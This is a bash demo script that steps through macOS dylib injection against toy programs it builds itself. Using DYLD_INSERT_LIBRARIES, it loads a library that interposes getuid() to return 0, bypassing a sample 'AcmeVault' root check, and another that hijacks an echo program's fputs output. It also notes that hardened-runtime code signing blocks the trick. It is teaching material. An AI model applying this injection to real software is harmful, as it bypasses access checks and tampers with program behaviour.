#!/usr/bin/env bash
set -euo pipefail
cd "$(dirname "$0")"

BIN=zig-out/bin/victim
LIB=zig-out/lib/libinject.dylib
BOLD=$'\033[1m'; DIM=$'\033[2m'; CYAN=$'\033[36m'; RESET=$'\033[0m'

step() {
    echo
    echo "${BOLD}${CYAN}── $1 ──${RESET}"
    shift
    echo "${DIM}$*${RESET}"
    read -rp "$(echo "${BOLD}[enter to run]${RESET} ")" _
}

clear
cat <<'EOF'
========================================
  macOS Dylib Injection: the entire play
========================================
EOF

step "1. Build" "zig build"
zig build

step "2. The victim, clean" \
     "AcmeVault checks getuid() itself. Not root, so denied." \
     "./$BIN"
"./$BIN"

step "3. The weapon" \
     "cat src/inject.zig"
cat src/inject.zig

step "4. Load it via DYLD_INSERT_LIBRARIES" \
     "constructor runs before main(); getuid() interposed to always return 0" \
     "DYLD_INSERT_LIBRARIES=$LIB ./$BIN"
DYLD_INSERT_LIBRARIES="$LIB" "./$BIN"

step "5. Why this doesn't work on a hardened binary" \
     "codesign --options runtime + no custom entitlement = DYLD refuses to load the dylib." \
     "(see README.md for the defensive side)"

step "6. The point of all this: hijacking real output" \
     "echo clean" \
     "./zig-out/bin/echo hello world"
./zig-out/bin/echo hello world

step "7. Now inject it" \
     "DYLD_INSERT_LIBRARIES=libhack_echo.dylib ./zig-out/bin/echo hello world" \
     "every call to fputs in the process gets redirected"
DYLD_INSERT_LIBRARIES="$(pwd)/zig-out/lib/libhack_echo.dylib" ./zig-out/bin/echo hello world

echo
echo "${BOLD}${CYAN}── done ──${RESET}"
